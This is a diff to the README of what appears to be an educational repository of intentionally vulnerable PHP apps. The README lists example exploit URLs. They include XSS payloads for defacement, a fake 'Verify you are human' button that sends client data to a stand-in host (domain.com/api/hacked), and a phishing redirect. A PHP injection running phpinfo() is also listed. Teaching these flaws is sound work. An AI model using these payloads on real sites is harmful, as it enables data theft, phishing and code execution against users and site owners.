@@ -27,9 +27,9 @@ This repository is intended for:
 Run on a php server locally. This has been tested on PHP version 8.3.12. You can find your PHP version by running `php --version`. For the example vulnerabilities, you can setup Mamp and have this app folder as `hacks` at the root htdocs and set port to 8888, otherwise adjust the example vulnerability url's as appropriately.
 
 ## Example Vulnerabilities
-- http://localhost:8888/hacks/echo/?name=%3Cscript%3Ealert(%22You%27re%20hacked!%22);%3C/script%3E
+- http://localhost:8888/hacks/echo/?name=%3Cscript%3Ealert(%22You%27re%20hacked%20by%20Weng%20Hackers%20Group!%22);%3C/script%3E
     - Cross-site scripting (XSS)
-    - Here exploited to inject into URL's that users share with others
+    - Here exploited to inject into URL's that users share with others a scary message. It's usually to ruin the reputation of a website or to boast that they're hacked by you.
     - Classification: 
         - CAPEC	19
         - CWE	79
@@ -37,8 +37,8 @@ Run on a php server locally. This has been tested on PHP version 8.3.12. You can
         - OWASP 2021 A3
 - http://localhost:8888/hacks/echo/?name=John%3Cscript%3Edocument.addEventListener(%22DOMContentLoaded%22,()=%3E{const%20d=document.createElement(%22div%22);d.innerHTML=`%3Cbutton%20onclick=%22fetch(%27https://domain.com/api/hacked%27,{method:%27POST%27,body:JSON.stringify({name:%27${name}%27})});%22%3EVerify%20you%20are%20human%3C/button%3E`;document.body.prepend(d)});%3C/script%3E
     - Cross-site scripting (XSS)
-    - Here when URL is shared, injects a "Verify you're human" button, but it steals user data stored on the client (could be cookies) and sends it to another server at domain.com/api/hacked/. Notice that is the hacker's server and that the hacker's server must have CORS enabled to accept paylods from other websites.
-    - The URL is a shortened snippet of:
+    - Here when URL is shared, injects a "Verify you're human" button, but it steals user data stored on the client (could be cookies) and sends it to another server at domain.com/api/hacked/, when the user clicks the button. Notice that is the hacker's server and that the hacker's server must have CORS enabled to accept paylods from other websites.
+    - The URL contains a minified code snippet of:
     ```
     document.addEventListener("DOMContentLoaded", () => {
         const div = document.createElement('div');
@@ -51,7 +51,7 @@ Run on a php server locally. This has been tested on PHP version 8.3.12. You can
     ```
 - http://localhost:8888/hacks/echo/?name=hi4;%3Cscript%3Ewindow.location.href=%22https://domain.com%22%3C/script%3E
     - Cross-site scripting (XSS)
-    - Here when URL is shared, redirects user to hacker's website. Note the hacker could take things further by making the website look similar to the website the url normally opens to, and then tricks the user to logging in.
+    - Here when URL is shared, redirects user to hacker's website. Note the hacker could take things further by making the website look similar to the website the url normally opens to, and then tricks the user to logging in, which can easily store the user credentials since the page is on the hacker's server.
 - http://localhost:8888/hacks/commands-php/?user-role=admin;phpinfo();
     - Remote Code Execution (RCE)
     - Here exploited to reveal PHP information that can be used for further attacks.
